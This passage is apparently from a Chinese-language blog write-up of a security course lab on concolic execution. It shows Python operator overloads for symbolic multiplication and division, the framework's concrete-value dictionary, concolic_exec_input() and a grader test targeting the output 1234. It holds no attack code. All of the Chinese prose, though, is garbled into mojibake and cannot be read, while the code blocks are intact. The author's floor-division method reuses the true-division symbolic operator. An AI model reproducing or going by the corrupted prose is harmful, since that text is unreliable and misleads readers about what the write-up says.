æ³•è¿ç®—æ–¹å¼ï¼šã€</p><ul><li>é¦–å…ˆåˆ¤æ–­è¿ç®—å¯¹è±¡æ˜¯å¦ä¸º <code>concolic_int</code> ï¼Œè‹¥æ˜¯åˆ™å°†è‡ªèº«å…·ä½“å€¼åŠ ä¸Šå¯¹è±¡å…·ä½“å€¼ï¼Œå¦åˆ™ç›´æ¥åŠ ä¸Šè¯¥å¯¹è±¡ï¼Œç»“æœå­˜æ”¾åˆ° <code>res</code></li><li>åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>concolic_int</code> å®ä¾‹ä½œä¸ºè¿”å›å€¼ï¼Œ<code>res</code> ä½œä¸ºå…¶å…·ä½“å€¼éƒ¨åˆ†ï¼Œåˆ›å»ºä¸¤ä¸ª <code>ast</code> å®ä¾‹å¹¶åˆ©ç”¨ <code>sym_plus()</code> è®¡ç®—ç»“æœä½œä¸ºæ–° concolic_int çš„ç¬¦å·å€¼éƒ¨åˆ†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬çš„ä¹˜é™¤æ³•å…¶å®ä¾è‘«èŠ¦ç”»ç“¢å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦åŒæ—¶å®ç° <code>/</code> ä¸ <code>//</code> ä¸¤ç§é™¤æ³•è¿ç®—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 2ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" alt="image.png"></p><p>ç„¶åæ˜¯ Exercise 3ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬ç†Ÿæ‚‰æ··åˆæ‰§è¡Œç³»ç»Ÿçš„ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæä¾›çš„é€”å¾„æ˜¯ä¿®æ”¹ <code>symex_exercises.py</code> ä»¥ç»™äºˆæµ‹è¯•ç³»ç»Ÿæ­£ç¡®çš„è¾“å…¥ï¼š</p><blockquote><p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Donâ€™t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>./check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>æ··åˆæ‰§è¡Œæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ä¾¿æ˜¯ <code>symex/fuzzy.py</code>  ä¸­çš„  <code>concolic_exec_input()</code> ï¼Œé¢˜ç›®è¯´åç»­æˆ‘ä»¬å°†ç”¨å…¶å®ç°ä¸€ä¸ªå®Œæ•´çš„æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œé‚£æˆ‘ä»¬å…ˆæ¥çœ‹å…¶ç›¸å…³çš„å…·ä½“å®ç°</p><h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2">æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2</h3><h4 id="VI-å…·ä½“å€¼å­—å…¸-ConcreteValues">VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues</h4><p>å¦‚å‰æ–‡æ‰€è¨€ï¼Œåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å­—å…¸ä¸­ï¼Œå®ä¸ºä¸€ä¸ª<code>ConctreteValues</code> ç±»å¯¹è±¡ï¼Œå®é™…ä¸Šå°±æ˜¯ python å­—å…¸çš„ä¸€ä¸ª wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>symex/fuzzy.py</code> ä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ <code>current_concrete_values</code>ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€è¯´çš„å…¨å±€å…·ä½“å€¼å­—å…¸ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>ConctreteValues.mk_global()</code> ä½¿è¯¥å¯¹è±¡å˜ä¸ºå…¨å±€å¼•ç”¨ï¼Œå³æˆ‘ä»¬æ¯æ¬¡ä½¿ç”¨åªéœ€è¦åˆ›å»ºä¸€ä¸ª<code>ConctreteValues</code> å¯¹è±¡å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥ç±»ä¸­æœ‰ä¸‰ä¸ªæŸ¥è¯¢å­—å…¸å†… id å¯¹åº”å…·ä½“å€¼å¹¶è¿”å›æ··åˆå€¼çš„å‡½æ•°ï¼Œè‹¥ id ä¸åœ¨å­—å…¸å†…åˆ™è¿›è¡Œæ·»åŠ ï¼ŒåŒæ—¶åœ¨ <code>symex/fuzzy.py</code> ä¸­å¸¦æœ‰ä¸‰ä¸ªå¯¹è¿™äº›å‡½æ•°çš„ wrapperï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„å‡½æ•°ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>add()</code> æˆå‘˜å‡½æ•°æ¥å‘å­—å…¸å†…æ·»åŠ æ˜ å°„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure><p>ä»¥åŠè¿˜æœ‰ä¸€ä¸ª <code>canonical_rep()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥è¿”å›å­—å…¸ä¸­çš„é”®å€¼å¯¹å…ƒç»„æ’åºåˆ—è¡¨ï¼Œä»¥åŠ <code>var_names()</code> ç”¨ä»¥è¿”å› id åˆ—è¡¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ª <code>inherit()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥ä»å¦ä¸€ä¸ªå­—å…¸ä¸­æ‹·è´é”®å€¼å¯¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure><h4 id="VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ">VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ</h4><p>è¯¥å‡½æ•°å†…å®¹ç”¨ä»¥æ ¹æ®ç»™äºˆçš„å­—å…¸å¯¹ä¼ å…¥çš„å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œæ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>åˆå§‹åŒ–ä¸¤ä¸ªå…¨å±€ç©ºåˆ—è¡¨ <code>cur_path_constr</code> ï¼ˆ<strong>å½“å‰è·¯å¾„çš„æ¡ä»¶çº¦æŸ</strong>ï¼‰ä¸ <code>cur_path_constr_callers</code>ï¼ˆå½“å‰è·¯å¾„çš„ä¿¡æ¯ï¼‰</li><li>è°ƒç”¨ <code>concrete_values.mk_global()</code> ä½¿å…¶æˆä¸ºä¸€ä¸ªå…¨å±€å­—å…¸</li><li>è°ƒç”¨ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆæ¥è·å¾—ä¸€ä¸ªå€¼ <code>v</code>ï¼Œè‹¥å‚æ•° <code>verbose &gt; 1</code> åˆ™æ‰“å°ä¸¤ä¸ªåˆ—è¡¨çš„å†…å®¹</li><li>æœ€åçš„è¿”å›å€¼ä¸º <code>(v, cur_path_constr, cur_path_constr_callers)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨è¯¥å‡½æ•°ä¸­å¹¶æ²¡æœ‰æ›´æ”¹è·¯å¾„çº¦æŸä¸ä¿¡æ¯çš„åˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™åœ¨ <code>add_constr()</code> ä¸­å®Œæˆï¼Œè¯¥å‡½æ•°åœ¨ <code>concolic_bool()</code> ä¸­è°ƒç”¨ï¼Œå°†çº¦æŸä¿¡æ¯è¿›è¡Œæ·»åŠ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>è€Œ <code>concolic_bool()</code> å®é™…ä¸Šåœ¨ <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„è¿ç®—ç¬¦é‡è½½ä¸­è¿›è¡Œè°ƒç”¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ¯æ¬¡æ‰§è¡Œ <code>concolic_exec_input()</code> éƒ½è¦<strong>é‡æ–°å°†è·¯å¾„çº¦æŸä¸ä¿¡æ¯åˆ—è¡¨æ¸…ç©º</strong>çš„ç¼˜æ•…ï¼Œè¿™é‡Œä»¥ <code>concolic_int </code>ä¸­çš„ <code>__cmp__</code> è¿ç®—ç¬¦ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>symex_exercises.py</code>  é‡Œæœ‰å•¥ï¼Œä¸»è¦å°±ä¸€ä¸ª <code>make_a_test()</code> å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å…¶ä¸­å®Œæˆå…¨å±€å…·ä½“å€¼å­—å…¸ <code>concrete_values</code> çš„æ„å»ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¿®æ”¹   <code>symex_exercises.py</code> ä¸­åˆ›å»ºçš„å­—å…¸å‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ Exercise 3 çš„è¯„åˆ¤æ ‡å‡†ï¼Œåœ¨ <code>check_lab3.py</code> ä¸­æ£€æµ‹çš„æ˜¯è¿è¡Œ <code>check-symex-int.py</code> åè¦è¾“å‡º <code>&quot;Found input for 1234&quot;</code> å­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>check-symex-int.py</code> ï¼Œå…¶å¼€å¤´çš„é€»è¾‘å¦‚ä¸‹ï¼Œ<code>r</code> çš„å€¼ä¸º 1234 å³å¯é€šè¿‡ Exercise 3ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¦‚å‰é¢æˆ‘ä»¬å¯¹ <code>concolic_exec_input()</code> çš„åˆ†æï¼Œ<code>r</code> çš„å€¼ç”±ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆå†³å®šï¼Œæ•…æˆ‘ä»¬æ¥çœ‹ <code>test_f()</code> çš„é€»è¾‘ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>mk_int()</code> ä»å…¨å±€å…·ä½“å€¼å­—å…¸ä¸­è·å– id ä¸º <code>i</code> çš„å€¼ä¼ å…¥ <code>f()</code> ä¸­è¿›è¡Œè¿ç®—ï¼Œè‹¥ä¸å­˜åœ¨ <code>i</code> åˆ™ <code>i</code> ä¼šè¢«é»˜è®¤èµ‹å€¼ <code>0</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>ç”±å‡½æ•° <code>f()</code> æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æˆ‘ä»¬åªéœ€è¦å‘å…·ä½“å€¼å­—å…¸ä¸­æ·»åŠ ä¸€ä¸ª <code>i = 123 * 7</code> çš„å€¼å³å¯è®© <code>test_f()</code> è¿”å› <code>1234</code>ï¼Œæ•…ä¿®æ”¹ <code>symex_exercises.py</code> å¦‚ä¸‹ï¼Œè¿™é‡Œç”¨ <code>mk_int()</code> å’Œ <code>add()</code> 